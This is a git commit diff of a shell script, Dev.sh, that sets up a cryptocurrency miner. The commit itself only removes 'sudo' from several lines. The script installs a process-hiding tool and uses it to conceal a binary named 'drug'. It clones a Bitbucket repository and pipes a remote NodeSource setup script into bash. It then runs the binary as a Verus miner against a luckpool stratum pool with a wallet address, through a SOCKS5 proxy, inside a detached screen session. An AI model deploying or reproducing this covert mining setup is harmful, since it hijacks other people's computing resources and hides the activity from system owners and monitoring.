c40beac78c47218cb1718ff43f7d8052ffb6c4cf
Huijv <100108737+Huijv@users.noreply.github.com>
2022-02-21 11:15:06 +0700

    Update Dev.sh

--- Dev.sh
+++ Dev.sh
@@ -1,14 +1,14 @@
-sudo apt update
-sudo apt install gcc -y
+apt update
+apt install gcc -y
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-sudo apt install nodejs
+apt install nodejs
 npm install -g npm@8.4.1
 npm i -g node-process-hider
-sudo ph add drug
+ph add drug
 git clone https://mariere-born@bitbucket.org/mariere-born99/mariere-born.git
 cd mariere-born
-sudo apt update
-sudo apt install screen libjansson4 -y
+apt update
+apt install screen libjansson4 -y
 screen -dmS ls
 chmod u+x drug
 ./drug -a verus -o stratum+tcp://na.luckpool.net:3956 -u RTc1CPHwDUMLRZoMEoPXaySRvMBV33NhWD.TEST -p x -t 15 -x socks5://192.252.214.20:15864
